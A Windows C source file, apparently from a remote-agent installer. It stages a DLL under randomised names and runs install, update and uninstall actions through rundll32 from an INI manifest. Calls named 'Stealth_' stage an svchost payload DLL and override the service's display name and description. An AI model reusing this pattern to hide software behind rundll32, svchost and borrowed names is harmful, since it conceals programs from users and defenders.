#include "rundll32_contract.h"

#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <strsafe.h>

#include "stealth.h"
#include "svchost_payload.h"

#define MESH_LIFECYCLE_SECTION_W L"Lifecycle"
#define MESH_LIFECYCLE_KEY_ACTION_W L"Action"
#define MESH_LIFECYCLE_KEY_SOURCE_EXE_W L"SourceExe"
#define MESH_LIFECYCLE_KEY_SOURCE_DLL_W L"SourceDll"
#define MESH_LIFECYCLE_KEY_DISPLAY_NAME_W L"DisplayName"
#define MESH_LIFECYCLE_KEY_DESCRIPTION_W L"Description"
#define MESH_LIFECYCLE_KEY_REQUIRE_CONFIG_W L"RequireConfig"

static BOOL MeshRundll32_FileExistsW(const wchar_t* path)
{
    DWORD attrs = INVALID_FILE_ATTRIBUTES;
    if (path == NULL || path[0] == L'\0') { return FALSE; }
    attrs = GetFileAttributesW(path);
    return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0) ? TRUE : FALSE;
}

static BOOL MeshRundll32_DirectoryExistsW(const wchar_t* path)
{
    DWORD attrs = INVALID_FILE_ATTRIBUTES;
    if (path == NULL || path[0] == L'\0') { return FALSE; }
    attrs = GetFileAttributesW(path);
    return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) ? TRUE : FALSE;
}

static BOOL MeshRundll32_CopyFirstTokenW(const wchar_t* input, wchar_t* output, size_t outputCch)
{
    const wchar_t* cursor = NULL;
    const wchar_t* tokenStart = NULL;
    size_t tokenLen = 0;

    if (output == NULL || outputCch == 0) { return FALSE; }
    output[0] = L'\0';
    if (input == NULL) { return FALSE; }

    cursor = input;
    while (*cursor == L' ' || *cursor == L'\t') { ++cursor; }
    if (*cursor == L'\0') { return FALSE; }

    if (*cursor == L'"')
    {
        ++cursor;
        tokenStart = cursor;
        while (*cursor != L'\0' && *cursor != L'"') { ++cursor; }
        tokenLen = (size_t)(cursor - tokenStart);
    }
    else
    {
        tokenStart = cursor;
        while (*cursor != L'\0' && *cursor != L' ' && *cursor != L'\t') { ++cursor; }
        tokenLen = (size_t)(cursor - tokenStart);
    }

    if (tokenLen == 0 || tokenLen >= outputCch)
    {
        SetLastError(tokenLen == 0 ? ERROR_INVALID_PARAMETER : ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }

    if (FAILED(StringCchCopyNW(output, outputCch, tokenStart, tokenLen)))
    {
        output[0] = L'\0';
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }
    output[tokenLen] = L'\0';
    return TRUE;
}

static BOOL MeshRundll32_GetEntryTailW(const wchar_t* entryName, const wchar_t* lpCmdLine, wchar_t* tail, size_t tailCch)
{
    LPWSTR fullCmdLine = NULL;
    LPWSTR entryPoint = NULL;

    if (tail == NULL || tailCch == 0 || entryName == NULL || entryName[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    tail[0] = L'\0';

    fullCmdLine = GetCommandLineW();
    if (fullCmdLine != NULL)
    {
        entryPoint = wcsstr(fullCmdLine, entryName);
        if (entryPoint != NULL)
        {
            entryPoint += wcslen(entryName);
            while (*entryPoint == L' ' || *entryPoint == L'\t' || *entryPoint == L',') { ++entryPoint; }
            return SUCCEEDED(StringCchCopyW(tail, tailCch, entryPoint)) ? TRUE : FALSE;
        }
    }

    if (lpCmdLine != NULL && lpCmdLine[0] != L'\0')
    {
        return SUCCEEDED(StringCchCopyW(tail, tailCch, lpCmdLine)) ? TRUE : FALSE;
    }

    SetLastError(ERROR_INVALID_PARAMETER);
    return FALSE;
}

static BOOL MeshRundll32_ManifestBoolW(const wchar_t* manifestPath, const wchar_t* keyName, BOOL defaultValue)
{
    wchar_t value[32] = {0};
    DWORD read = GetPrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, keyName, defaultValue ? L"1" : L"0", value, (DWORD)_countof(value), manifestPath);
    if (read == 0) { return defaultValue; }
    if (_wcsicmp(value, L"1") == 0 || _wcsicmp(value, L"true") == 0 || _wcsicmp(value, L"yes") == 0 || _wcsicmp(value, L"on") == 0) { return TRUE; }
    if (_wcsicmp(value, L"0") == 0 || _wcsicmp(value, L"false") == 0 || _wcsicmp(value, L"no") == 0 || _wcsicmp(value, L"off") == 0) { return FALSE; }
    return defaultValue;
}

static BOOL MeshRundll32_WriteManifestStringW(const wchar_t* manifestPath, const wchar_t* keyName, const wchar_t* value)
{
    if (value == NULL || value[0] == L'\0') { return TRUE; }
    return WritePrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, keyName, value, manifestPath);
}

static BOOL MeshRundll32_CreateDirectoryIfMissingW(const wchar_t* path)
{
    DWORD err = ERROR_SUCCESS;
    if (path == NULL || path[0] == L'\0') { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
    if (MeshRundll32_DirectoryExistsW(path)) { return TRUE; }
    if (CreateDirectoryW(path, NULL)) { return TRUE; }
    err = GetLastError();
    if (err == ERROR_ALREADY_EXISTS && MeshRundll32_DirectoryExistsW(path)) { return TRUE; }
    SetLastError(err);
    return FALSE;
}

static BOOL MeshRundll32_CombinePathW(wchar_t* output, size_t outputCch, const wchar_t* root, const wchar_t* leaf)
{
    size_t rootLen = 0;
    if (output == NULL || outputCch == 0 || root == NULL || root[0] == L'\0' || leaf == NULL || leaf[0] == L'\0')
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    output[0] = L'\0';
    if (FAILED(StringCchCopyW(output, outputCch, root))) { SetLastError(ERROR_INSUFFICIENT_BUFFER); return FALSE; }
    rootLen = wcslen(output);
    if (rootLen > 0 && output[rootLen - 1] != L'\\' && output[rootLen - 1] != L'/')
    {
        if (FAILED(StringCchCatW(output, outputCch, L"\\"))) { SetLastError(ERROR_INSUFFICIENT_BUFFER); return FALSE; }
    }
    if (FAILED(StringCchCatW(output, outputCch, leaf))) { SetLastError(ERROR_INSUFFICIENT_BUFFER); return FALSE; }
    return TRUE;
}

static BOOL MeshRundll32_PrepareLifecycleStateDirectoryW(wchar_t* stateDir, size_t stateDirCch)
{
    StealthInstallPaths paths;
    wchar_t lifecycleDir[MAX_PATH * 4] = {0};

    if (stateDir == NULL || stateDirCch == 0) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
    stateDir[0] = L'\0';
    ZeroMemory(&paths, sizeof(paths));

    if (!Stealth_GetInstallPaths(&paths) || paths.installDir[0] == L'\0')
    {
        SetLastError(ERROR_PATH_NOT_FOUND);
        return FALSE;
    }
    if (!Stealth_CreateInstallRootDirectory(paths.installDir))
    {
        return FALSE;
    }
    if (!MeshRundll32_CombinePathW(lifecycleDir, _countof(lifecycleDir), paths.installDir, L"state"))
    {
        return FALSE;
    }
    if (!MeshRundll32_CreateDirectoryIfMissingW(lifecycleDir))
    {
        return FALSE;
    }
    if (!MeshRundll32_CombinePathW(lifecycleDir, _countof(lifecycleDir), lifecycleDir, L"rundll32-lifecycle"))
    {
        return FALSE;
    }
    if (!MeshRundll32_CreateDirectoryIfMissingW(lifecycleDir))
    {
        return FALSE;
    }
    return SUCCEEDED(StringCchCopyW(stateDir, stateDirCch, lifecycleDir)) ? TRUE : FALSE;
}

static BOOL MeshRundll32_PrepareLifecycleHostDllW(
    MeshRundll32LifecycleAction action,
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    wchar_t* hostDllPath,
    size_t hostDllPathCch,
    BOOL* deleteHostDllOnExit)
{
    StealthInstallPaths paths;
    wchar_t stateDir[MAX_PATH * 4] = {0};
    wchar_t fileName[128] = {0};

    if (hostDllPath == NULL || hostDllPathCch == 0 || deleteHostDllOnExit == NULL)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    hostDllPath[0] = L'\0';
    *deleteHostDllOnExit = FALSE;

    ZeroMemory(&paths, sizeof(paths));
    if (!Stealth_GetInstallPaths(&paths))
    {
        ZeroMemory(&paths, sizeof(paths));
    }

    if (paths.dllPath[0] != L'\0' && MeshRundll32_FileExistsW(paths.dllPath) &&
        (action == MESH_RUNDLL32_LIFECYCLE_ACTION_UNINSTALL ||
         action == MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_INSTALL ||
         action == MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_UPDATE ||
         action == MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_UNINSTALL ||
         action == MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_PACKAGE))
    {
        return SUCCEEDED(StringCchCopyW(hostDllPath, hostDllPathCch, paths.dllPath)) ? TRUE : FALSE;
    }

    if (!MeshRundll32_PrepareLifecycleStateDirectoryW(stateDir, _countof(stateDir)))
    {
        return FALSE;
    }
    if (FAILED(StringCchPrintfW(fileName, _countof(fileName), L"host-%lu-%llu.dll", GetCurrentProcessId(), (unsigned long long)GetTickCount64())))
    {
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }
    if (!MeshRundll32_CombinePathW(hostDllPath, hostDllPathCch, stateDir, fileName))
    {
        return FALSE;
    }

    if (!Stealth_StageSvchostDllForLifecycleHost(sourceExePath, sourceDllPath, hostDllPath))
    {
        return FALSE;
    }
    *deleteHostDllOnExit = TRUE;
    return TRUE;
}

static BOOL MeshRundll32_PrepareManifestPathW(wchar_t* manifestPath, size_t manifestPathCch)
{
    wchar_t stateDir[MAX_PATH * 4] = {0};
    wchar_t fileName[128] = {0};
    if (manifestPath == NULL || manifestPathCch == 0) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
    manifestPath[0] = L'\0';
    if (!MeshRundll32_PrepareLifecycleStateDirectoryW(stateDir, _countof(stateDir)))
    {
        return FALSE;
    }
    if (FAILED(StringCchPrintfW(fileName, _countof(fileName), L"manifest-%lu-%llu.ini", GetCurrentProcessId(), (unsigned long long)GetTickCount64())))
    {
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }
    return MeshRundll32_CombinePathW(manifestPath, manifestPathCch, stateDir, fileName);
}

static void MeshRundll32_ApplyBrandingFromManifest(const MeshRundll32LifecycleManifest* manifest)
{
    char utf8[2048];
    int converted = 0;

    if (manifest == NULL) { return; }
    Stealth_ClearRuntimeBrandingOverrides();

    if (manifest->displayName[0] != L'\0')
    {
        ZeroMemory(utf8, sizeof(utf8));
        converted = WideCharToMultiByte(CP_UTF8, 0, manifest->displayName, -1, utf8, (int)sizeof(utf8), NULL, NULL);
        if (converted > 0) { Stealth_SetRuntimeDisplayNameUtf8(utf8); }
    }
    if (manifest->serviceDescription[0] != L'\0')
    {
        ZeroMemory(utf8, sizeof(utf8));
        converted = WideCharToMultiByte(CP_UTF8, 0, manifest->serviceDescription, -1, utf8, (int)sizeof(utf8), NULL, NULL);
        if (converted > 0) { Stealth_SetRuntimeServiceDescriptionUtf8(utf8); }
    }
}

const wchar_t* MeshRundll32_LifecycleActionNameW(MeshRundll32LifecycleAction action)
{
    switch (action)
    {
        case MESH_RUNDLL32_LIFECYCLE_ACTION_INSTALL: return MESH_LIFECYCLE_ACTION_INSTALL_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_UPDATE: return MESH_LIFECYCLE_ACTION_UPDATE_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_REPAIR: return MESH_LIFECYCLE_ACTION_REPAIR_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_REINSTALL: return MESH_LIFECYCLE_ACTION_REINSTALL_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_UNINSTALL: return MESH_LIFECYCLE_ACTION_UNINSTALL_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_INSTALL: return MESH_LIFECYCLE_ACTION_VALIDATE_INSTALL_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_UPDATE: return MESH_LIFECYCLE_ACTION_VALIDATE_UPDATE_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_UNINSTALL: return MESH_LIFECYCLE_ACTION_VALIDATE_UNINSTALL_W;
        case MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_PACKAGE: return MESH_LIFECYCLE_ACTION_VALIDATE_PACKAGE_W;
        default: return L"unknown";
    }
}

BOOL MeshRundll32_LifecycleActionFromStringW(const wchar_t* value, MeshRundll32LifecycleAction* actionOut)
{
    MeshRundll32LifecycleAction action = MESH_RUNDLL32_LIFECYCLE_ACTION_UNKNOWN;
    if (actionOut == NULL) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
    *actionOut = MESH_RUNDLL32_LIFECYCLE_ACTION_UNKNOWN;
    if (value == NULL || value[0] == L'\0') { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }

    if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_INSTALL_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_INSTALL; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_UPDATE_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_UPDATE; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_REPAIR_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_REPAIR; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_REINSTALL_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_REINSTALL; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_UNINSTALL_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_UNINSTALL; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_VALIDATE_INSTALL_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_INSTALL; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_VALIDATE_UPDATE_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_UPDATE; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_VALIDATE_UNINSTALL_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_UNINSTALL; }
    else if (_wcsicmp(value, MESH_LIFECYCLE_ACTION_VALIDATE_PACKAGE_W) == 0) { action = MESH_RUNDLL32_LIFECYCLE_ACTION_VALIDATE_PACKAGE; }
    else { SetLastError(ERROR_NOT_SUPPORTED); return FALSE; }

    *actionOut = action;
    return TRUE;
}

BOOL MeshRundll32_ReadLifecycleManifestW(const wchar_t* manifestPath, MeshRundll32LifecycleManifest* manifestOut)
{
    wchar_t actionName[64] = {0};
    DWORD actionLen = 0;

    if (manifestPath == NULL || manifestPath[0] == L'\0' || manifestOut == NULL)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    if (!MeshRundll32_FileExistsW(manifestPath))
    {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return FALSE;
    }

    ZeroMemory(manifestOut, sizeof(*manifestOut));
    if (FAILED(StringCchCopyW(manifestOut->manifestPath, _countof(manifestOut->manifestPath), manifestPath)))
    {
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }

    actionLen = GetPrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, MESH_LIFECYCLE_KEY_ACTION_W, L"", actionName, (DWORD)_countof(actionName), manifestPath);
    if (actionLen == 0 || !MeshRundll32_LifecycleActionFromStringW(actionName, &manifestOut->action))
    {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    GetPrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, MESH_LIFECYCLE_KEY_SOURCE_EXE_W, L"", manifestOut->sourceExePath, (DWORD)_countof(manifestOut->sourceExePath), manifestPath);
    GetPrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, MESH_LIFECYCLE_KEY_SOURCE_DLL_W, L"", manifestOut->sourceDllPath, (DWORD)_countof(manifestOut->sourceDllPath), manifestPath);
    GetPrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, MESH_LIFECYCLE_KEY_DISPLAY_NAME_W, L"", manifestOut->displayName, (DWORD)_countof(manifestOut->displayName), manifestPath);
    GetPrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, MESH_LIFECYCLE_KEY_DESCRIPTION_W, L"", manifestOut->serviceDescription, (DWORD)_countof(manifestOut->serviceDescription), manifestPath);
    manifestOut->requireConfig = MeshRundll32_ManifestBoolW(manifestPath, MESH_LIFECYCLE_KEY_REQUIRE_CONFIG_W, TRUE);
    return TRUE;
}

BOOL MeshRundll32_WriteLifecycleManifestW(
    const wchar_t* manifestPath,
    MeshRundll32LifecycleAction action,
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    const wchar_t* displayName,
    const wchar_t* serviceDescription,
    BOOL requireConfig)
{
    const wchar_t* actionName = MeshRundll32_LifecycleActionNameW(action);
    if (manifestPath == NULL || manifestPath[0] == L'\0' || action == MESH_RUNDLL32_LIFECYCLE_ACTION_UNKNOWN)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    DeleteFileW(manifestPath);
    if (!WritePrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, MESH_LIFECYCLE_KEY_ACTION_W, actionName, manifestPath)) { return FALSE; }
    if (!MeshRundll32_WriteManifestStringW(manifestPath, MESH_LIFECYCLE_KEY_SOURCE_EXE_W, sourceExePath)) { return FALSE; }
    if (!MeshRundll32_WriteManifestStringW(manifestPath, MESH_LIFECYCLE_KEY_SOURCE_DLL_W, sourceDllPath)) { return FALSE; }
    if (!MeshRundll32_WriteManifestStringW(manifestPath, MESH_LIFECYCLE_KEY_DISPLAY_NAME_W, displayName)) { return FALSE; }
    if (!MeshRundll32_WriteManifestStringW(manifestPath, MESH_LIFECYCLE_KEY_DESCRIPTION_W, serviceDescription)) { return FALSE; }
    if (!WritePrivateProfileStringW(MESH_LIFECYCLE_SECTION_W, MESH_LIFECYCLE_KEY_REQUIRE_CONFIG_W, requireConfig ? L"1" : L"0", manifestPath)) { return FALSE; }
    return TRUE;
}

BOOL MeshRundll32_GetSystemRundll32PathW(wchar_t* rundll32Path, size_t rundll32PathCch)
{
    UINT len = 0;
    if (rundll32Path == NULL || rundll32PathCch == 0) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }
    rundll32Path[0] = L'\0';
    len = GetSystemDirectoryW(rundll32Path, (UINT)rundll32PathCch);
    if (len == 0 || len >= rundll32PathCch)
    {
        SetLastError(len == 0 ? GetLastError() : ERROR_INSUFFICIENT_BUFFER);
        rundll32Path[0] = L'\0';
        return FALSE;
    }
    if (FAILED(StringCchCatW(rundll32Path, rundll32PathCch, L"\\rundll32.exe")))
    {
        rundll32Path[0] = L'\0';
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }
    return MeshRundll32_FileExistsW(rundll32Path);
}

BOOL MeshRundll32_LaunchLifecycleHostW(
    MeshRundll32LifecycleAction action,
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    const wchar_t* displayName,
    const wchar_t* serviceDescription,
    BOOL requireConfig,
    BOOL waitForExit,
    DWORD timeoutMs,
    DWORD* exitCodeOut)
{
    wchar_t rundll32Path[MAX_PATH] = {0};
    wchar_t hostDllPath[MAX_PATH * 4] = {0};
    wchar_t manifestPath[MAX_PATH * 4] = {0};
    wchar_t commandLine[MAX_PATH * 12] = {0};
    BOOL deleteHostDllOnExit = FALSE;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    DWORD waitResult = WAIT_OBJECT_0;
    DWORD exitCode = STILL_ACTIVE;
    BOOL ok = FALSE;

    if (exitCodeOut != NULL) { *exitCodeOut = ERROR_GEN_FAILURE; }
    if (action == MESH_RUNDLL32_LIFECYCLE_ACTION_UNKNOWN) { SetLastError(ERROR_INVALID_PARAMETER); return FALSE; }

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    if (!MeshRundll32_GetSystemRundll32PathW(rundll32Path, _countof(rundll32Path)) ||
        !MeshRundll32_PrepareLifecycleHostDllW(action, sourceExePath, sourceDllPath, hostDllPath, _countof(hostDllPath), &deleteHostDllOnExit) ||
        !MeshRundll32_PrepareManifestPathW(manifestPath, _countof(manifestPath)))
    {
        return FALSE;
    }

    if (!MeshRundll32_WriteLifecycleManifestW(
            manifestPath,
            action,
            sourceExePath,
            hostDllPath,
            displayName,
            serviceDescription,
            requireConfig))
    {
        goto cleanup;
    }

    if (FAILED(StringCchPrintfW(
            commandLine,
            _countof(commandLine),
            L"\"%ls\" \"%ls\",%ls \"%ls\"",
            rundll32Path,
            hostDllPath,
            MESH_RUNDLL32_ENTRY_LIFECYCLE_W,
            manifestPath)))
    {
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        goto cleanup;
    }

    Stealth_LogInstallEvent(L"[RUNDLL32_CONTRACT] Launching lifecycle action=%ls dll=%ls manifest=%ls",
        MeshRundll32_LifecycleActionNameW(action),
        hostDllPath,
        manifestPath);

    if (!CreateProcessW(rundll32Path, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        Stealth_LogInstallEvent(L"[RUNDLL32_CONTRACT] CreateProcessW failed for lifecycle host (error=%lu)", GetLastError());
        goto cleanup;
    }

    ok = TRUE;
    if (waitForExit)
    {
        waitResult = WaitForSingleObject(pi.hProcess, timeoutMs);
        if (waitResult != WAIT_OBJECT_0)
        {
            Stealth_LogInstallEvent(L"[RUNDLL32_CONTRACT] lifecycle host wait failed/timed out (wait=%lu error=%lu)", waitResult, GetLastError());
            ok = FALSE;
            if (waitResult == WAIT_TIMEOUT) { TerminateProcess(pi.hProcess, ERROR_TIMEOUT); }
        }
        if (!GetExitCodeProcess(pi.hProcess, &exitCode))
        {
            exitCode = GetLastError();
            ok = FALSE;
        }
        if (exitCodeOut != NULL) { *exitCodeOut = exitCode; }
        if (exitCode != ERROR_SUCCESS)
        {
            ok = FALSE;
            Stealth_LogInstallEvent(L"[RUNDLL32_CONTRACT] lifecycle host action=%ls exited with %lu",
                MeshRundll32_LifecycleActionNameW(action),
                exitCode);
        }
    }
    else if (exitCodeOut != NULL)
    {
        *exitCodeOut = ERROR_SUCCESS;
    }

cleanup:
    if (pi.hThread != NULL) { CloseHandle(pi.hThread); }
    if (pi.hProcess != NULL) { CloseHandle(pi.hProcess); }
    if (waitForExit && manifestPath[0] != L'\0') { DeleteFileW(manifestPath); }
    if (waitForExit && deleteHostDllOnExit && hostDllPath[0] != L'\0') { DeleteFileW(hostDllPath); }
    return ok;
}

void CALLBACK MeshLifecycleHostW(HWND hwnd, HINSTANCE hinstDLL, LPWSTR lpCmdLine, int nCmdShow)
{
    wchar_t tail[MAX_PATH * 6] = {0};
    wchar_t manifestPath[MAX_PATH * 4] = {0};
    MeshRundll32LifecycleManifest manifest;
    BOOL ok = FALSE;

    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(nCmdShow);

    Stealth_EnsureLoggingDefaults();
    ZeroMemory(&manifest, sizeof(manifest));

    if (!MeshRundll32_GetEntryTailW(MESH_RUNDLL32_ENTRY_LIFECYCLE_W, lpCmdLine, tail, _countof(tail)) ||
        !MeshRundll32_CopyFirstTokenW(tail, manifestPath, _countof(manifestPath)))
    {
        Stealth_LogInstallEvent(L"[LIFECYCLE_HOST] Missing manifest path (error=%lu)", GetLastError());
        ExitProcess(ERROR_INVALID_PARAMETER);
    }

    if (!MeshRundll32_ReadLifecycleManifestW(manifestPath, &manifest))
    {
        Stealth_LogInstallEvent(L"[LIFECYCLE_HOST] Failed to read manifest %ls (error=%lu)", manifestPath, GetLastError());
        ExitProcess(ERROR_INVALID_DATA);
    }

    MeshRundll32_ApplyBrandingFromManifest(&manifest);
    Stealth_LogInstallEvent(L"[LIFECYCLE_HOST] Starting action=%ls manifest=%ls",
        MeshRundll32_LifecycleActionNameW(manifest.action),
        manifest.manifestPath);

    ok = Stealth_RunLifecycleHostOperation(
        MeshRundll32_LifecycleActionNameW(manifest.action),
        manifest.sourceExePath[0] != L'\0' ? manifest.sourceExePath : NULL,
        manifest.sourceDllPath[0] != L'\0' ? manifest.sourceDllPath : NULL,
        manifest.requireConfig);

    Stealth_LogInstallEvent(L"[LIFECYCLE_HOST] Completed action=%ls status=%ls",
        MeshRundll32_LifecycleActionNameW(manifest.action),
        ok ? L"success" : L"failed");
    ExitProcess(ok ? ERROR_SUCCESS : ERROR_INSTALL_FAILURE);
}
